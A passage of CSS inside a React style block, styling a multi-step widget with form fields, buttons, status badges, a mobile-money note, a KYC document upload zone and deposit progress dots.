        font-size: .72rem; font-weight: 700;
        color: #5f6673; text-transform: uppercase; letter-spacing: .05em;
      }
      .wg-field input, .wg-field select {
        padding: 12px; font-size: .88rem; font-weight: 600; color: #20242d;
        background: #f8f8fb; border: 1.5px solid #e8e8ed;
        border-radius: 8px; outline: 0;
        text-transform: none; letter-spacing: normal;
        font-family: 'DM Sans', sans-serif;
        transition: border-color .14s ease;
      }
      .wg-field input:focus, .wg-field select:focus {
        border-color: var(--red, #F36600);
        background: #fff;
      }
      .wg-field select { cursor: pointer; }

      /* ── Submit button ── */
      .wg-submit-btn {
        display: flex; align-items: center; justify-content: center; gap: 8px;
        width: 100%; min-height: 48px; border-radius: 10px;
        font: 800 .86rem 'DM Sans', sans-serif; color: #fff;
        background: var(--red, #F36600); cursor: pointer;
        border: none; text-decoration: none; margin-top: 4px;
        transition: transform .16s ease, box-shadow .2s ease;
        box-shadow: 0 6px 18px rgba(243,102,0,.28);
      }
      .wg-submit-btn:hover:not(:disabled) {
        transform: translateY(-2px);
        box-shadow: 0 10px 24px rgba(243,102,0,.34);
      }
      .wg-submit-btn:disabled { opacity: .6; cursor: default; transform: none; box-shadow: none; }

      /* ── Ghost button ── */
      .wg-ghost-btn {
        display: inline-flex; align-items: center; justify-content: center;
        gap: 6px; width: 100%; min-height: 40px;
        background: #f4f4f6; color: #20242d;
        border: 1px solid #e8e8ed; border-radius: 8px;
        padding: 9px 18px; font: 700 .76rem 'DM Sans', sans-serif;
        cursor: pointer; text-decoration: none;
        transition: background .14s ease;
      }
      .wg-ghost-btn:hover:not(:disabled) { background: #e8e8ed; }
      .wg-ghost-btn:disabled { opacity: .55; cursor: default; }

      /* ── Inline error ── */
      .wg-inline-error {
        margin: 0; padding: 10px 13px; border-radius: 9px;
        background: rgba(243,102,0,.07); color: #c81530;
        font-size: .78rem; font-weight: 600;
      }

      /* ── Inline note ── */
      .wg-inline-note { margin: 0; font-size: .76rem; color: #5f6673; text-align: center; }
      .wg-note-err { color: var(--red, #F36600); }
      .wg-note-ok  { color: var(--nature, #0da653); }

      /* ── MoMo note ── */
      .wg-momo-note {
        display: flex; align-items: flex-start; gap: 7px; margin: 2px 0 0;
        color: #9a9ea8; font-size: .74rem; line-height: 1.55;
      }
      .wg-momo-note svg { flex-shrink: 0; margin-top: 1px; color: var(--nature, #0da653); }

      /* ── Status screen ── */
      .wg-status {
        display: flex; flex-direction: column; align-items: center;
        text-align: center; gap: 6px; padding: 10px 4px 4px;
      }
      .wg-status-badge {
        display: flex; align-items: center; justify-content: center;
        width: 52px; height: 52px; border-radius: 50%; margin-bottom: 6px;
        background: rgba(243,102,0,.08); color: var(--red, #F36600);
        border: 2px solid rgba(243,102,0,.22);
      }
      .wg-status-badge.wg-status-wait {
        background: rgba(243,102,0,.12); color: var(--red, #F36600);
        border-color: rgba(243,102,0,.3);
      }
      .wg-status-badge.wg-status-ok {
        background: rgba(13,166,83,.12); color: var(--nature, #0da653);
        border-color: rgba(13,166,83,.3);
      }
      .wg-status-badge.wg-status-bad {
        background: rgba(220,38,38,.1); color: #dc2626;
        border-color: rgba(220,38,38,.3);
      }
      .wg-status h4 { margin: 0; font: 800 16px 'DM Sans', sans-serif; color: #20242d; }
      .wg-status-sub {
        margin: 0; max-width: 340px; color: #5f6673;
        font-size: .8rem; line-height: 1.6;
      }

      /* ── Phone chip ── */
      .wg-phone-chip {
        display: inline-flex; align-items: center; gap: 7px;
        padding: 8px 13px; border-radius: 999px;
        background: rgba(243,102,0,.07); color: var(--red, #F36600);
        font-size: .76rem; font-weight: 700; margin-top: 6px;
      }

      /* ── Progress bar ── */
      .wg-progress {
        width: 100%; max-width: 220px; height: 3px; border-radius: 99px;
        background: #e8e8ed; overflow: hidden; margin-top: 14px;
      }
      .wg-progress span {
        display: block; height: 100%; width: 100%;
        background: var(--red, #F36600);
        transform-origin: left;
        animation: wg-fill linear forwards;
      }
      @keyframes wg-fill { from { transform: scaleX(0); } to { transform: scaleX(1); } }

      /* ── Timer hint ── */
      .wg-timer-hint { margin-top: 10px; color: #9a9ea8; font-size: .68rem; }

      /* ── KYC upload ── */
      .wg-upload-zone {
        display: flex; flex-direction: column; align-items: center; justify-content: center;
        gap: 8px; padding: 28px 16px; border: 2px dashed #d0d0da; border-radius: 12px;
        cursor: pointer; color: #9a9ea8; font-size: .8rem;
        transition: border-color .2s, background .2s; text-align: center;
      }
      .wg-upload-zone:hover { border-color: var(--red, #F36600); background: #fff8f8; }
      .wg-upload-icon { color: #c0c0c8; }
      .wg-upload-zone small { font-size: .68rem; color: #b0b0ba; }
      .wg-upload-preview { max-height: 140px; border-radius: 8px; object-fit: cover; width: 100%; }
      .wg-file-name {
        display: flex; align-items: center; gap: 5px;
        font-size: .73rem; color: #6366f1; font-weight: 600; margin: 0;
      }

      /* ── KYC pulse bar ── */
      .wg-pulse-bar {
        height: 4px; border-radius: 4px;
        background: linear-gradient(90deg, var(--red,#F36600) 0%, #f9c 50%, var(--red,#F36600) 100%);
        background-size: 200% 100%;
        animation: wg-pulse 1.8s linear infinite;
      }
      @keyframes wg-pulse {
        0%   { background-position: 200% 0; }
        100% { background-position: -200% 0; }
      }

      /* ── Deposit dots ── */
      .wg-dep-dots { display: flex; gap: 12px; justify-content: center; padding: 4px 0; }
      .wg-dep-dot {
        display: flex; flex-direction: column; align-items: center; gap: 5px;
        width: 72px; height: 72px; border-radius: 14px;
        border: 2px solid #e8e8ed; background: #f8f8fb;
        color: #b0b0ba; font-size: .7rem; font-weight: 800; justify-content: center;
        transition: border-color .2s, background .2s, color .2s;
      }
      .wg-dep-dot small { font-size: .6rem; color: #b0b0ba; font-weight: 600; }
      .wg-dep-dot-done {
        border-color: var(--nature, #0da653);
        background: rgba(13,166,83,.07);
        color: var(--nature, #0da653);
      }
      .wg-dep-dot-done small { color: var(--nature, #0da653); }
      .wg-dep-actions { display: flex; flex-direction: column; gap: 9px; }

      /* ── Locked placeholder ── */
      .wg-locked-msg {
        display: flex; flex-direction: column; align-items: center; gap: 10px;
        padding: 28px 20px; text-align: center; color: #9a9ea8; font-size: .82rem;
      }
      .wg-locked-msg p { margin: 0; }

      @media (max-width: 480px) {
        .wg-stepper { padding: 12px 10px 0; }
        .wg-step-label { font-size: .55rem; max-width: 58px; }
        .wg-panel { padding: 16px 14px 20px; }
      }
    `}</style>
  );
}
